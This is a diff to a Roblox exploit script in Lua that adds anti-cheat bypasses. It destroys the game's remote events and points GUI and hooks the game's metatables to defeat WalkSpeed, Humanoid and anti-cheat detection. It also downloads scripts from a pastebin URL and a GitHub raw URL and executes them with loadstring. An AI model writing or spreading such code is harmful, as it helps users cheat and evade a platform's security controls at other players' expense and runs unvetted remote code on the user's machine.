@@ -31,7 +31,7 @@ local function safeSpawn(fn)
     end)
 end
 
--- Suppress global output functions (save old versions)
+-- Suppress global print/warn/error, keep old versions if needed
 local oldPrint, oldWarn, oldError = print, warn, error
 print = function() end
 warn = function() end
@@ -209,7 +209,6 @@ do
 
     -- Restore camera when character respawns to avoid lock sticky
     LocalPlayer.CharacterAdded:Connect(function(character)
-        -- Wait for Humanoid to exist
         character:WaitForChild("Humanoid", 10)
         unlockCamera()
     end)
@@ -281,10 +280,7 @@ do
     end)
 end
 
--- [Rest of your anti-cheat hooking, remote block, and bypass code with safeSpawn and pcall]
--- (Preserve the enhanced error handling versions from before)
-
--- Example for anti-cheat hooking:
+-- Anti-cheat hooking and bypass logic with safe error handling
 safeSpawn(function()
     local getinfo = getinfo or debug.getinfo
     local DEBUG = false
@@ -339,6 +335,199 @@ safeSpawn(function()
     pcall(setthreadidentity, 7)
 end)
 
--- Follow with your remaining blocking remote events/functions, bypasses, etc. as before.
+-- Blocking RemoteEvents and RemoteFunctions as per settings
+safeSpawn(function()
+    local backoff = 1
+    while true do
+        local success, err = pcall(function()
+            local Remotes = game.ReplicatedStorage:FindFirstChild("Remotes")
+            if Remotes then
+                local events = Remotes:FindFirstChild("Events")
+                if events and events:FindFirstChild("GameManager") then
+                    events.GameManager:Destroy()
+                end
+
+                if BLOCK_REMOTE_EVENTS or BLOCK_REMOTE_FUNCTIONS then
+                    for _, remote in pairs(Remotes:GetDescendants()) do
+                        if remote:IsA("RemoteEvent") and BLOCK_REMOTE_EVENTS then
+                            remote:Destroy()
+                        elseif remote:IsA("RemoteFunction") and BLOCK_REMOTE_FUNCTIONS then
+                            remote:Destroy()
+                        end
+                    end
+                end
+            end
+        end)
+
+        if not success then
+            warn("[Remote Blocking Error]: " .. tostring(err))
+            backoff = math.min(backoff * 2, 10)
+        else
+            backoff = 1
+        end
+        wait(backoff)
+    end
+end)
+
+-- Disable Points GUI or similar
+safeSpawn(function()
+    local backoff = 1
+    while true do
+        local success, err = pcall(function()
+            local points = LocalPlayer.PlayerGui:FindFirstChild("Points")
+            if points then
+                points.Disabled = true
+                if points:FindFirstChild("PointsCreator") then
+                    points.PointsCreator.Disabled = true
+                end
+                points:Destroy()
+            end
+
+            local starterGui = game:GetService("StarterGui")
+            if starterGui:FindFirstChild("Points") then
+                starterGui.Points.Disabled = true
+                starterGui.Points:Destroy()
+            end
+            if starterGui:FindFirstChild("PointsCreator") then
+                starterGui.PointsCreator.Disabled = true
+            end
+        end)
+
+        if not success then
+            warn("[Points GUI Disable Error]: " .. tostring(err))
+            backoff = math.min(backoff * 2, 10)
+        else
+            backoff = 1
+        end
+        wait(backoff)
+    end
+end)
+
+-- Load external bypass scripts with error handling
+safeSpawn(function()
+    local urls = {
+        "https://raw.githubusercontent.com/Exunys/Anti-Kick/main/Anti-Kick.lua",
+        "https://pastebin.com/raw/MZrwt5Rm"
+    }
+    for _, url in ipairs(urls) do
+        local success, err = pcall(function()
+            local content = game:HttpGet(url)
+            local fn = loadstring(content)
+            if fn then fn() end
+        end)
+        if not success then
+            warn("[Load Script Error]: " .. tostring(err))
+        end
+        wait(3)
+    end
+end)
+
+-- WalkSpeed Bypass Example with metatable hooks
+safeSpawn(function()
+    while wait(5) do
+        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            pcall(function()
+                local mt = getrawmetatable(game)
+                local oldIndex = mt.__index
+                local oldNewIndex = mt.__newindex
+                setreadonly(mt, false)
+                mt.__newindex = newcclosure(function(t, k, v)
+                    if k == "WalkSpeed" and t == humanoid then
+                        return
+                    end
+                    return oldNewIndex(t, k, v)
+                end)
+                mt.__index = oldIndex
+                setreadonly(mt, true)
+            end)
+        end
+    end
+end)
+
+-- CoreGui Detection Bypass
+safeSpawn(function()
+    for _, gui in pairs(CoreGui:GetChildren()) do
+        if gui.Name == "RobloxGui" or gui.Name == "SomeAntiCheatCoreGui" then
+            gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+                pcall(function()
+                    if gui.Enabled == false then
+                        gui.Enabled = true
+                    end
+                end)
+            end)
+        end
+    end
+end)
+
+-- BTools Detection Bypass
+safeSpawn(function()
+    local backpack = LocalPlayer:WaitForChild("Backpack")
+    for _, tool in pairs(backpack:GetChildren()) do
+        if tool.Name:match("BTools") then
+            pcall(function() tool:Destroy() end)
+        end
+    end
+end)
+
+-- gcinfo bypass
+safeSpawn(function()
+    pcall(function()
+        gcinfo = function() return math.random(10000, 20000) end
+    end)
+end)
+
+-- Humanoid Detection Bypass
+safeSpawn(function()
+    pcall(function()
+        local mt = getrawmetatable(game)
+        local oldIndex = mt.__index
+        setreadonly(mt, false)
+        mt.__index = newcclosure(function(t, k)
+            if k == "Humanoid" then
+                return nil
+            end
+            return oldIndex(t, k)
+        end)
+        setreadonly(mt, true)
+    end)
+end)
+
+-- FindInstance & InstanceIsA Bypass
+safeSpawn(function()
+    pcall(function()
+        local mt = getrawmetatable(game)
+        local oldNameCall = mt.__namecall
+        local oldIndex = mt.__index
+        setreadonly(mt, false)
+        mt.__namecall = newcclosure(function(self, ...)
+            local method = getnamecallmethod()
+            local args = {...}
+            if method == "FindFirstChild" then
+                if args[1] and type(args[1]) == "string" and args[1]:lower():find("anticheat") then
+                    return nil
+                end
+            elseif method == "IsA" then
+                if tostring(self) == "Humanoid" and args[1] and type(args[1]) == "string" and args[1]:lower():find("humanoid") then
+                    return false
+                end
+            end
+            return oldNameCall(self, ...)
+        end)
+
+        mt.__index = function(t, k)
+            if tostring(k) == "FindFirstChild" then
+                return function(self, childName)
+                    if childName and type(childName) == "string" and childName:lower():find("anticheat") then
+                        return nil
+                    end
+                    return t.FindFirstChild(self, childName)
+                end
+            end
+            return oldIndex(t, k)
+        end
+        setreadonly(mt, true)
+    end)
+end)
 
 return true
